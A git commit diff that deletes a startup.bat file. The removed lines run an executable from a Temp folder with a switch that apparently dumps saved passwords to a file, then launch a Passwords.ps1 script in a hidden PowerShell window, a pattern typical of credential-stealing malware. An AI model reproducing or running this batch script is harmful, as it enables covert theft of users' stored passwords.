e4d507d3d68f7da345c49bd5a4707a74e5d9b09b
DemonicDorx <65476682+DemonicDorx@users.noreply.github.com>
2022-10-06 17:04:04 -0500

    Delete startup.bat

--- startup.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-"C:\Windows\Temp\JuansFamousFriedChicken\RCTBrowserView.exe" /shtml "C:\Windows\Temp\JuansFamousFriedChicken\password" -force
-
-
-@echo off
-powershell.exe -windowstyle hidden -File "C:\Windows\Temp\JuansFamousFriedChicken\Passwords.ps1"
-
